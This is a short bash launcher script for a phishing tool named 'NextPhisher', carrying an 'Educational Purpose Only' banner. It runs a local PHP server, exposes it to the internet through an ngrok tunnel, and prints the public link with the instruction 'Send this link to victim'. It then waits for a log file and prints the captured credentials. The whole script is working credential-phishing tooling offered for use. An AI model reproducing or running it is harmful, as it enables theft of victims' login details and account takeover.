#!/bin/bash
# NextPhisher Tool - Educational Purpose Only

# Colors
RED='\033[1;31m'
GREEN='\033[1;32m'
NC='\033[0m' # No Color

# Banner
echo -e "${GREEN}"
echo " _   _      _   _           _     _           "
echo "| \ | | ___| |_| |__   ___ | |__ (_)_ __ ___  "
echo "|  \| |/ _ \ __| '_ \ / _ \| '_ \| | '_ \` _ \ "
echo "| |\  |  __/ |_| | | | (_) | |_) | | | | | | |"
echo "|_| \_|\___|\__|_| |_|\___/|_.__/|_|_| |_| |_|"
echo -e "${NC}"

# Dependencies check
dependencies=(php curl openssh wget)
for dep in "${dependencies[@]}"; do
    command -v $dep >/dev/null 2>&1 || {
        echo -e "${RED}Error: $dep is not installed.${NC}"
        exit 1
    }
done

# Start PHP Server (Port 3333)
echo -e "${GREEN}Starting PHP server on port 3333...${NC}"
php -S 127.0.0.1:3333 > /dev/null 2>&1 &

# Ngrok Tunnel
if [[ -e "ngrok" ]]; then
    echo -e "${GREEN}Starting ngrok tunnel...${NC}"
    ./ngrok http 3333 > /dev/null 2>&1 &
    sleep 5
    link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[0-9a-z]*\.ngrok.io')
    echo -e "${GREEN}Send this link to victim: $link${NC}"
else
    echo -e "${RED}Ngrok not found! Please download ngrok and place in script folder.${NC}"
fi

# Wait for captured data
echo -e "${GREEN}Waiting for target to open the link...${NC}"
while true; do
    if [[ -e "log.txt" ]]; then
        echo -e "${GREEN}Credentials captured!${NC}"
        cat log.txt
        break
    fi
    sleep 2
done
